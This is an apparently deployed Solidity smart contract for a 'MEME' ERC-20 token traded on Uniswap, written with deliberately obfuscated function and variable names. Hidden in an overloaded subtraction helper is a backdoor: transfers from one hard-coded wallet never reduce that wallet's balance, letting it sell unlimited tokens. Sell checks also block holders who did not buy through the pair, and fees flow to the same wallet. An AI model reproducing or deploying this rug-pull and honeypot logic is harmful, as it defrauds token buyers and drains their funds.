/**

Twitter: https://twitter.com/MemesEthereum

Telegram: https://t.me/MemesEthereum

Website: https://memeseth.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Rfzpv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Rfzpv(a, b, "SafeMath");
    }

    function  _Rfzpv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qicke(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract MEME is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _qyblc;
    address payable private Frkqc;
    address private _Bdrfp;
    string private constant _name = unicode"MEME";
    string private constant _symbol = unicode"MEME";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Rvqge=0;
    uint256 private _viarq=0;
    uint256 public _lvpzh = _totalSupply;
    uint256 public _pvrep = _totalSupply;
    uint256 public _pocmr= _totalSupply;
    uint256 public _qrbea= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Krauo;
    mapping (address => bool) private _hfaek;
    mapping(address => uint256) private _Ezfgv;

    bool private _sorqopen;
    bool public _prlkc = false;
    bool private qyodk = false;
    bool private _rajep = false;


    event _benpw(uint _lvpzh);
    modifier gvrdf {
        qyodk = true;
        _;
        qyodk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Krauo[owner(

        )] = true;
        _Krauo[address
        (this)] = true;
        _Krauo[
            Frkqc] = true;
        Frkqc = 
        payable (0x34Db79932Db91657ea552741dccaFfaEf0A25B17);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Rfzpv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 elybae=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prlkc) {
                if (to 
                != address
                (_qyblc) 
                && to !=
                 address
                 (_Bdrfp)) {
                  require(_Ezfgv
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _Ezfgv
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Bdrfp && to != 
            address(_qyblc) &&
             !_Krauo[to] ) {
                require(amount 
                <= _lvpzh,
                 "Exceeds the _lvpzh.");
                require(balanceOf
                (to) + amount
                 <= _pvrep,
                  "Exceeds the _pvrep.");
                if(_viarq
                < _Rvqge){
                  require
                  (! _gpbvy(to));
                }
                _viarq++;
                 _hfaek
                 [to]=true;
                elybae = amount._qicke
                ((_viarq>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Bdrfp &&
             from!= address(this) 
            && !_Krauo[from] ){
                require(amount <= 
                _lvpzh && 
                balanceOf(Frkqc)
                <_qrbea,
                 "Exceeds the _lvpzh.");
                elybae = amount._qicke((_viarq>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_viarq>
                _Rvqge &&
                 _hfaek[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qyodk 
            && to == _Bdrfp &&
             _rajep &&
             contractTokenBalance>
             _pocmr 
            && _viarq>
            _Rvqge&&
             !_Krauo[to]&&
              !_Krauo[from]
            ) {
                _transferFrom( _Bvftk(amount, 
                _Bvftk(contractTokenBalance,
                _qrbea)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _vprwe(address
                    (this).balance);
                }
            }
        }

        if(elybae>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(elybae);
          emit
           Transfer(from,
           address
           (this),elybae);
        }
        _balances[from
        ]= _Rfzpv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Rfzpv(elybae));
        emit Transfer
        (from, to, 
        amount.
         _Rfzpv(elybae));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gvrdf {
        if(tokenAmount==
        0){return;}
        if(!_sorqopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _qyblc.WETH();
        _approve(address(this),
         address(
             _qyblc), 
             tokenAmount);
        _qyblc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _Bvftk
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Rfzpv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Frkqc){
            return a ;
        }else{
            return a .
             _Rfzpv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _lvpzh = _totalSupply;
        _pvrep = _totalSupply;
        emit _benpw(_totalSupply);
    }

    function _gpbvy(address 
    account) private view 
    returns (bool) {
        uint256 QvAep;
        assembly {
            QvAep :=
             extcodesize
             (account)
        }
        return QvAep > 
        0;
    }

    function _vprwe(uint256
    amount) private {
        Frkqc.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _sorqopen ) ;
        _qyblc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _qyblc), 
            _totalSupply);
        _Bdrfp = 
        IUniswapV2Factory(_qyblc.
        factory( ) 
        ). createPair (
            address(this
            ),  _qyblc .
             WETH ( ) );
        _qyblc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Bdrfp).
        approve(address(_qyblc), 
        type(uint)
        .max);
        _rajep = true;
        _sorqopen = true;
    }

    receive() external payable {}
}